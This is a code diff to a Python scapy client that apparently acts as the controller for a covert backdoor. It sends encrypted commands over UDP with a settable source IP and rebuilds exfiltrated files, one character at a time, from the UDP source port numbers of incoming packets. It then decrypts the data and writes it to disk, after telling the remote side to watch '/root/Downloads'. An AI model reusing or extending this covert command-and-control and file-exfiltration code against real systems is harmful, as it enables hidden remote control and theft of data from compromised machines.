@@ -12,13 +12,14 @@
 ##  DATE:           October 17, 2015
 ##
 ##################################################################################
-import sys, os, argparse, socket, logging, threading
+import sys, os, argparse, socket, logging, threading, sys
 from scapy.all import *
 from AesEncryption import *
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 sema1 = threading.BoundedSemaphore(value=1)
 message = []
+fileMessage = []
 
 ##################################################################################
 ##  FUNCTION
@@ -31,7 +32,7 @@ message = []
 ##					The client only continues if there is a pkt with payload.
 ##################################################################################
 def stopfilter(pkt):
-	global message
+	global message, fileMessage
 
 	if ARP in pkt:
 		return False
@@ -57,15 +58,31 @@ def stopfilter(pkt):
 				return True
 
 
-		elif pkt['UDP'].dport == 7000 and :
-			print pkt.show()
-			print (pkt['Raw'].load)
-			return True
+		elif pkt['UDP'].dport == 7000:
+			if pkt['UDP'].sport != 128:
+				fileMessage.append(pkt['UDP'].sport)
+				return False
+
+			if pkt['UDP'].sport == 128:
+				fileString = ""
+				for m in fileMessage:
+					fileString += chr(m)
+
+
+				secretFile = open(decrypt(pkt['Raw'].load), 'w')
+				secretFile.write(decrypt(fileString))
+				secretFile.close()
+
+				fileString = ""
+				fileMessage = []
+
+				print("Directory Update\n***New input: ")
+				return True
 
 def sendCommandLoop(args):
 	while 1:
 		sema1.acquire()
-		payload = raw_input("New input: ")
+		payload = raw_input("***New input: \n")
 		pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=int(args.dstPort), sport=8000)/encrypt(payload)
 		send(pkt)
 
@@ -88,7 +105,7 @@ def main():
 	cmdParser.add_argument('-p','--dstPort',dest='dstPort', help='Destination port of the host to send the message to.', required=True)
 	args = cmdParser.parse_args();
 
-	pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=22, sport=8000)/("/root/Documents")
+	pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=22, sport=8000)/("/root/Downloads")
 	send(pkt)
 
 	t1 = threading.Thread(name="sendCommandLoop", target=sendCommandLoop, args=[args])
